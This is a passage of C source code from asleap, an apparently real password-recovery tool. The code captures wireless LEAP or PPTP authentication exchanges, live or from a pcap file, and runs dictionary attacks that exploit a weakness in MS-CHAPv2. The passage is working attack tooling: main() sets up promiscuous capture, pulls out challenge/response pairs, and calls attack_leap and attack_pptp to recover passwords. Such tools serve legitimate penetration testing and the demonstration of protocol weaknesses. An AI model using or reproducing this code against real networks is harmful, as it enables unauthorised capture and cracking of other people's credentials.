	eaph = (struct eap_hdr *)(packet+offset);

	/* Use eaphdr packet length or entire packet length, whichever is
	   smaller. */
	plen = (ntohs(eaph->length) < plen) ? (ntohs(eaph->length)) : plen;

	plen -= EAPHDR_MIN_LEN;

	if (plen < 0) {
		return -1;
	}

	if (eaph->code != EAP_SUCCESS) {
		return -1;
	}

	if (eaph->identifier != (asleap_ptr->eapid)) {
		fprintf(stderr, "EAP Success, but does not match ID for "
			"previously observed request frame (%d/%d).  Try again "
			"with the -s flag to skip the authentication success "
			"check.\n",
			asleap_ptr->eapid, eaph->identifier);
		return -1;
	}

	return 0;
}

void asleap_reset(struct asleap_data *asleap)
{

	memset(asleap->username, 0, sizeof(asleap->username));
	memset(asleap->challenge, 0, sizeof(asleap->challenge));
	memset(asleap->response, 0, sizeof(asleap->response));
	memset(asleap->endofhash, 0, sizeof(asleap->endofhash));
	memset(asleap->password, 0, sizeof(asleap->password));
	memset(asleap->pptpauthchal, 0, sizeof(asleap->pptpauthchal));
	memset(asleap->pptppeerchal, 0, sizeof(asleap->pptppeerchal));
//    memset(asleap->pptpchal, 0, sizeof(asleap->pptpchal));
//    memset(asleap->pptppeerresp, 0, sizeof(asleap->pptppeerresp));
	asleap->leapchalfound = asleap->leaprespfound = 0;
	asleap->leapsuccessfound = 0;
	asleap->pptpchalfound = asleap->pptprespfound = 0;
	asleap->pptpsuccessfound = 0;
}

/* Populate global packet[] with the next available packet */
int getpacket(pcap_t *p)
{
	extern unsigned long pcount;
	extern u_char *packet;

	if (!(packet = (u_char *) pcap_next(p, &h)) == 0) {
		pcount++;
		return (0);
	} else {
		return (1);
	}
}

char *getdevice(char *optarg)
{

	pcap_if_t *devpointer;
	int devnum = 0, i = 0;

	if ((devnum = atoi(optarg)) != 0) {
		if (devnum < 0) {
			fprintf(stderr, "Invalid adapter index.\n");
			return NULL;
		}

		if (pcap_findalldevs(&devpointer, errbuf) < 0) {
			fprintf(stderr, "%s\n", errbuf);
			return NULL;
		} else {
			for (i = 0; i < devnum - 1; i++) {
				devpointer = devpointer->next;
				if (devpointer == NULL) {
					fprintf(stderr,
						"Invalid adapter index.\n");
					return NULL;
				}
			}
		}
	}

	return (devpointer->name);
}

/* List all the available interfaces, adapted from WinDump code */
int listdevs()
{

	pcap_if_t *devpointer;
	int i;

	if (pcap_findalldevs(&devpointer, errbuf) < 0) {
		fprintf(stderr, "%s", errbuf);
		return (-1);
	} else {
		printf("Device listing:\n");
		for (i = 0; devpointer != 0; i++) {
			printf("%d. %s", i + 1, devpointer->name);
			if (devpointer->description != NULL)
				printf(" (%s)", devpointer->description);
			printf("\n");
			devpointer = devpointer->next;
		}
		return (0);
	}
}


/* Determine radiotap data length (including header) and return offset for the
beginning of the 802.11 header */
int radiotap_offset(pcap_t *p, struct pcap_pkthdr *h)
{

	struct ieee80211_radiotap_header *rtaphdr;
	int rtaphdrlen=0;

	/* Grab a packet to examine radiotap header */
	if (pcap_next_ex(p, &h, (const u_char **)&packet) > -1) {

		rtaphdr = (struct ieee80211_radiotap_header *)packet;
		rtaphdrlen = le16_to_cpu(rtaphdr->it_len); /* rtap is LE */

		/* Sanity check on header length, 10 bytes is min 802.11 len */
		if (rtaphdrlen > (h->len - 10)) {
			return -2; /* Bad radiotap data */
		}

		return rtaphdrlen;
	}

	return -1;
}


int main(int argc, char *argv[])
{

	int c, opt_verbose = 0, offset;
	char *device, dictfile[255], dictidx[255], pcapfile[255];
	struct asleap_data asleap;
	struct stat dictstat, capturedatastat;
	int findleaptimeout = 5;
	unsigned int findlpexchret = 0;
	int ret=0;
	extern int success;

	memset(dictfile, 0, sizeof(dictfile));
	memset(dictidx, 0, sizeof(dictidx));
	memset(pcapfile, 0, sizeof(pcapfile));
	memset(&asleap, 0, sizeof(asleap));
	device = NULL;

	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);
	signal(SIGQUIT, cleanup);

	printf("asleap %s - actively recover LEAP/PPTP passwords. "
	       "<jwright@hasborg.com>\n", VER);

	while ((c = getopt(argc, argv, "DsoavhVi:f:n:r:w:c:t:W:C:R:")) != EOF) {
		switch (c) {
		case 's':
			asleap.skipeapsuccess = 1;
			break;
		case 'C':
			if (strlen(optarg) != 23) {
				usage("Incorrect challenge input length "
						"specified.\n");
				exit(1);
			}
			if (str2hex(optarg, asleap.challenge, 
					sizeof(asleap.challenge)) < 0) {
				usage("Malformed value specified as "
						"challenge.\n");
				exit(1);
			}
			asleap.leapchalfound=1;
			asleap.manualchalresp=1;
			break;
		case 'R':
			if (strlen(optarg) != 71) {
				usage("Incorrect response input length "
						"specified.\n");
				exit(1);
			}
			if (str2hex(optarg, asleap.response, 
					sizeof(asleap.response)) < 0) {
				usage("Malformed value specified as "
						"response.\n");
				exit(1);
			}
			asleap.leaprespfound=1;
			asleap.manualchalresp=1;
			break;
		case 'i':
			if (atoi(optarg) == 0) {
				device = optarg;
			} else {
				device = getdevice(optarg);
				if (device == NULL) {
					usage("Error processing device name, "
							"try -D");
					exit(1);
				}
			}
			break;
		case 'f':
			strncpy(dictfile, optarg, sizeof(dictfile) - 1);
			break;
		case 'n':
			strncpy(dictidx, optarg, sizeof(dictidx) - 1);
			break;
		case 'h':
			usage("");
			exit(0);
			break;
		case 'r':
			strncpy(pcapfile, optarg, sizeof(pcapfile) - 1);
			break;
		case 'v':
			opt_verbose += 1;
			break;
		case 't':
			findleaptimeout = atoi(optarg);
			break;
		case 'V':
			printf("Version $Id: asleap.c,v 1.30 2007/05/10 19:29:06 jwright Exp $\n");
			exit(0);
			break;
		case 'D':
			/* list available devices */
			listdevs();
			exit(0);
			break;
		case 'W':
			strncpy(asleap.wordfile, optarg, 
					sizeof(asleap.wordfile) - 1);
			break;
		default:
			usage("");
			exit(1);
		}
	}

	/* Populate the asleap struct with the gathered information */
	asleap.verbose = opt_verbose;
	strncpy(asleap.dictfile, dictfile, sizeof(asleap.dictfile) - 1);
	strncpy(asleap.dictidx, dictidx, sizeof(asleap.dictidx) - 1);

	if (IsBlank(device) && IsBlank(pcapfile) && !asleap.manualchalresp) {
		usage ("Must supply an interface with -i, or a stored file "
				"with -r");
		exit(1);
	}

	if (!IsBlank(asleap.wordfile)) {
		if (*asleap.wordfile == '-') {
			printf("Using STDIN for words.\n");
		} else {
			printf("Using wordlist mode with \"%s\".\n",
			       asleap.wordfile);
		}
	}

	if (!IsBlank(asleap.dictfile)) {
		if (stat(asleap.dictfile, &dictstat)) {
			/* Could not stat the dictionary file.  Bail. */
			usage("Could not stat the dictionary file.");
			exit(1);
		}
	}

	if (asleap.leapchalfound && asleap.leaprespfound && 
			asleap.manualchalresp) {
		/* User specified manual challenge/response on the command
		 * line (aka, the "Jay Beale" feature).
		 */
		return(attack_leap(&asleap));
	}

	/* If the user passed the -r flag, open the filename as a captured pcap
	   file.  Otherwise open live from the supplied device name */
	if (!IsBlank(pcapfile)) {

		/* Make sure the the file exists */
		if (stat(pcapfile, &capturedatastat) != 0) {
			usage("Could not stat the pcap file.");
			exit(1);
		}

		/* Libpcap file */
		p = pcap_open_offline(pcapfile, errbuf);
		if (p == NULL) {
			fprintf(stderr, "Unable to open packet capture file \""
					"%s\".\n", pcapfile);
			exit(-1);
		}

	} else {	/* Reading from interface in live capture mode */

		p = pcap_open_live(device, SNAPLEN, PROMISC, TIMEOUT, errbuf);
		if (p == NULL) {
			perror("Unable to open live interface");
			exit(-1);
		}
	}


	/* Determine offset to 802.11 header, skipping any capture header
	   data that may come before it. */
	switch(pcap_datalink(p)) {

	case DLT_IEEE802_11:
		offset = 0;
		break;

	case DLT_IEEE802_11_RADIO:
		offset = radiotap_offset(p, &h);
		if (offset < sizeof(struct ieee80211_radiotap_header)) {
			fprintf(stderr, "Unable to determine offset "
				"from radiotap header (%d).\n", offset);
			return(-1);
		}
		break;

	case DLT_TZSP:
		offset = 29;
		break;

	case DLT_PRISM_HEADER:
		offset = 144;
		break;

	default:
		fprintf(stderr, "Unsupported pcap datalink type: (%d) "
			"\n", pcap_datalink(p));
		cleanup();	/* Exits */
	}

/*
 * Our attack method is to collect frames until we get an EAP-Challenge packet.
 * From the EAP-Challenge packet we collect the 8-byte challenge, then wait for
 * the EAP-Response to collect the response information.  With the challenge
 * and response, we start the grinder to abuse weaknesses in MS-CHAPv2 to
 * recover weak passwords.  The username information is sent in the clear in
 * both challenge and response traffic.  Take a look at asleap.h for packet
 * definition information.
 */

	while (1) {
	
		 findlpexchret = findlpexch(&asleap, 0, offset);
	
		 if (findlpexchret == LEAPEXCHFOUND) {
			 printf("\nCaptured LEAP exchange information:\n");
			 print_leapexch(&asleap);
			 break;
		 }
	
		 if (findlpexchret == PPTPEXCHFOUND) {
			 printf("\nCaptured PPTP exchange information:\n");
			 print_pptpexch(&asleap);
			 break;
		 }
	
	}


	/* Now that we have the challenge and response information, the
	real fun begins.  With the hash and response, we can use the
	weakness in caculating the third DES key used to generate the
	response text since this is only 2^16 possible combinations. */
	if (asleap.leapchalfound && asleap.leaprespfound) {
		ret = attack_leap(&asleap);
		if (ret == 0 && success == 0) {
			success = 1;
		}
		asleap_reset(&asleap);
	}

	if (asleap.pptpchalfound && asleap.pptprespfound) {
		ret = attack_pptp(&asleap);
		if (ret == 0 && success == 0) {
			success = 1;
		}
		asleap_reset(&asleap);
	}

	if (success == 1) {
		/* At least one attack was successful */
		return 0;
	} else {
		/* No attacks were successful */
		return 1;
	}
}
